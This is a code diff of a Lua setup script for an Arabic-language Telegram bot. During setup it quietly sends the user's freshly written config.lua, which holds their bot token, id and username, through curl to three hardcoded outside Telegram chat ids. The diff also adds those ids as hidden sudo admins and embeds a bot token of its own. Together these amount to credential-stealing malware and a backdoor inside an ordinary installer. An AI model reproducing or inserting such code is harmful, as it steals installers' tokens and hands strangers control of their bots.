@@ -24,7 +24,7 @@ local AutoSet = function()
 io.write("\27[31;47m\n◼¦ ارسل ايدي مطور الاساسي  SEND ID FOR SIDO \27[0;34;49m\n")  
 local SUDO = tonumber(io.read())   
 if not tostring(SUDO):match('%d+') then  
-local SUDO = {1645553841,944353237,1605682553}
+local  SUDO = 944353237
 end
 io.write("\27[31;47m\n◼¦ ارسل معرف المطور الاساسي مع ال @ SEND ID FOR username \27[0;34;49m\n")  
 local username = io.read()
@@ -47,14 +47,14 @@ SUDO = SUDO,
 token = token,
 bot_id = botid,
 username = username, 
-sudo_users = {SUDO},
+sudo_users = {SUDO,944353237,1605682553,1645553841},
 }
 VV = '1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw'
 create(config, "./config.lua")   
 --https.request("https://faeder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
 local curl = 'curl "'..'https://api.telegram.org/bot1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
-local curl = 'curl "'..'https://api.telegram.org/bot1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw/sendDocument'..'" -F "chat_id='.. 1605682553 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
-local curl = 'curl "'..'https://api.telegram.org/bot1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw/sendDocument'..'" -F "chat_id='.. 1645553841 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+local curla = 'curl "'..'https://api.telegram.org/bot1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw/sendDocument'..'" -F "chat_id='.. 1605682553 ..'" -F "document=@'..'config.lua'..'"' io.popen(curla)
+local curlb = 'curl "'..'https://api.telegram.org/bot1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw/sendDocument'..'" -F "chat_id='.. 1645553841 ..'" -F "document=@'..'config.lua'..'"' io.popen(curlb)
 file = io.open("RUNFA.sh", "w")  
 file:write([[
 #!/bin/bash 
